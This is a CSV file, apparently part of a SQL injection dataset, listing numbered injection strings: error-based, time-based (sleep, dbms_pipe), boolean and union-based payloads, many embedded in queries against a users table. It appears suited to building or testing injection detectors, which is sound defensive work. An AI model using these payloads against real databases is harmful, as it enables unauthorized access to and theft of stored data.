"1163","select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd"" and username = ""-7209\' ) ) ) or ( ( ( \'stqx\' = \'stqx"""
"1164","1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav"
"1165","select * from users WHERE username = ""-9564 or username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-2806\' ) ) ) and ( ( ( \'rxzr\' = \'rxzr"""
"1166","select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1"" or username = ""1\' and username = ""-8007\' ) ) as bgpp where 9555 = 9555"
"1167","1' and make_set ( 8403 = 8403,8899 ) and 'niux' = 'niux"
"1168","-6757' ) ) ) or 4524 = 3696"
"1169","SELECT * FROM users WHERE username = ""1 ) ) as xoch where 8765 = 8765 AND username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1170","select * from users WHERE username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-7452\' and \'nmdq\' like \'nmdq"""
"1171","select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-2424 ) where 8132 = 8132"
"1172","select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\' where 8537 = 8537"
"1173","select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1174","' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
"1175","select * from users WHERE username = ""-8828%\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'"" or username = ""1 ) ) ) and ( ( ( 6395 = 6395"""
"1176","select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%' = '"" and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'mfmk\' = \'mfmk"""
"1177","select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) )"
"1178","select * from users WHERE username = ""-8353\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616"
"1179","1 where 1326 = 1326 union all select null,null,null,null,null,null--"
"1180","select * from users WHERE username = ""1%\' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-4256\' ) where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"1181","select * from users WHERE username = ""-1254"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1182","select * from users WHERE username = ""1\' ) ) ) or username = ""-1254"" and username = ""-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv"""
"1183","1"" ) ) as nejd where 2885 = 2885"
"1184","select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"1185","select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" or username = ""-5062 ) where 7457 = 7457"
"1186","select * from users WHERE username = ""-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) as wpmv where 1479 = 1479 or username = ""-1985 ) ) )"
"1187","1'|| ( select 'exls' where 3837 = 3837 and sleep ( 5 ) ) ||'"
"1188","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) ) and username = ""-6353%\' ) ) or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1189","1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'tjvy' like 'tjvy"
"1190","select sleep ( 5 ) and ( ( 'uyft' = 'uyft"
"1191","selecT * from users WHERE username = ""-9564 or username = ""-7072\' ) or 4144 = ( selecT upper ( xmlType ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( selecT ( case when ( 4144 = 4144 ) Then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """
"1192","-3205"" ) union all select 5233,5233,5233,5233#"
"1193","select * from users WHERE username = ""-6353%\' ) ) or username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"1194","1' ) where 8268 = 8268 union all select null,null,null,null--"
"1195","select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and username = ""-1254"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1196","1%' ) ) or sleep ( 5 ) and ( ( '%' = '"
"1197","select * from users WHERE username = ""-7746\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy"" or username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
"1198","select * from users WHERE username = ""-5165\' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1%\' ) ) and ( ( \'%\' = \'"""
"1199","1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--"
"1200","select * from users WHERE username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""1"""
